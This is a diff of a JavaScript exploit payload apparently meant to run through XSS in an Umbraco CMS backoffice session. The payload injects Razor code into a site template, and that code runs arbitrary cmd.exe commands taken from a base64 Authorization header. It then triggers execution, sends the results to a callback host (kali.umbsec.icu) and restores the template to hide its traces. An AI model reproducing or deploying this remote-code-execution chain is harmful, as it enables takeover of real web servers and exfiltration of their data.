@@ -1,39 +1,32 @@
 // Payload configuration
-const cmd = "whoami";
+const cmd = "dir";
+const umbracoAPI = "/umbraco/backoffice/UmbracoApi";
 const razorTemplateName = "Home";
 const razorPayloadElementID = "umb-xss";
 const triggerURL = "/";
-const triggerHeaderName = "X-UMB";
-const triggerHeaderValue = "1";
+const triggerHeaderName = "Authorization";
 const callbackURL = "http://kali.umbsec.icu/";
 
 (async function () {
   // Get template
-  const allTemplates = await getJSON(
-    "/umbraco/backoffice/UmbracoApi/Template/GetAll"
-  );
-  const homeTemplateStub = allTemplates.find((x) =>
+  const allTemplates = await getJSON(`${umbracoAPI}/Template/GetAll`);
+  const templateStub = allTemplates.find((x) =>
     x.name.includes(razorTemplateName)
   );
-  const homeTemplate = await getJSON(
-    `/umbraco/backoffice/UmbracoApi/Template/GetById?id=${homeTemplateStub.id}`
-  );
+  const template = await getJSON(`${umbracoAPI}/Template/GetById?id=${templateStub.id}`);
 
-  // Save original template. It will be restored later on.
-  const originalTemplate = homeTemplate.content;
+  // Save original template. It will be restored later on
+  const originalTemplate = template.content;
 
   // Add payload to the end of the template
-  homeTemplate.content += generatePayload();
+  template.content += generatePayloadRazor();
 
   // Save template
-  const saveTemplate = await postJSON(
-    "/umbraco/backoffice/UmbracoApi/Template/PostSave",
-    homeTemplate
-  );
+  const saveTemplate = await postJSON(`${umbracoAPI}/Template/PostSave`, template);
 
   // Hit URL to trigger command execution
   const triggerHeaders = {};
-  triggerHeaders[triggerHeaderName] = triggerHeaderValue;
+  triggerHeaders[triggerHeaderName] = btoa(cmd);
   const triggerURLResponse = await fetch(triggerURL, {
     headers: triggerHeaders,
   });
@@ -52,21 +45,17 @@ const callbackURL = "http://kali.umbsec.icu/";
   });
 
   // Reset to original template
-  homeTemplate.content = originalTemplate;
-  const resetTemplate = await postJSON(
-    "/umbraco/backoffice/UmbracoApi/Template/PostSave",
-    homeTemplate
-  );
+  template.content = originalTemplate;
+  const resetTemplateResponse = await postJSON(`${umbracoAPI}/Template/PostSave`, template);
 
   /*
    * Helper Functions
    */
 
   function getCookie(name) {
-    return (
-      document.cookie.match("(^|;)\\s*" + name + "\\s*=\\s*([^;]+)")?.pop() ||
-      ""
-    );
+    const value = `; ${document.cookie}`;
+    const parts = value.split(`; ${name}=`);
+    if (parts.length === 2) return parts.pop().split(";").shift();
   }
 
   async function getJSON(url) {
@@ -98,16 +87,18 @@ const callbackURL = "http://kali.umbsec.icu/";
     return JSON.parse(responseText.slice(6));
   }
 
-  function generatePayload() {
+  function generatePayloadRazor() {
     return `
-@if (Request.Headers["${triggerHeaderName}"] == "${triggerHeaderValue}")
+@if (!string.IsNullOrEmpty(Request.Headers["${triggerHeaderName}"]))
 {
     try
     {
+        var cmd = System.Text.Encoding.UTF8.GetString(
+            System.Convert.FromBase64String(Request.Headers["${triggerHeaderName}"]));
         using (var process = new System.Diagnostics.Process())
         {
             process.StartInfo.FileName = "cmd.exe";
-            process.StartInfo.Arguments = "/c ${cmd}";
+            process.StartInfo.Arguments = "/c " + cmd;
             process.StartInfo.CreateNoWindow = true;
             process.StartInfo.RedirectStandardOutput = true;
             process.StartInfo.UseShellExecute = false;
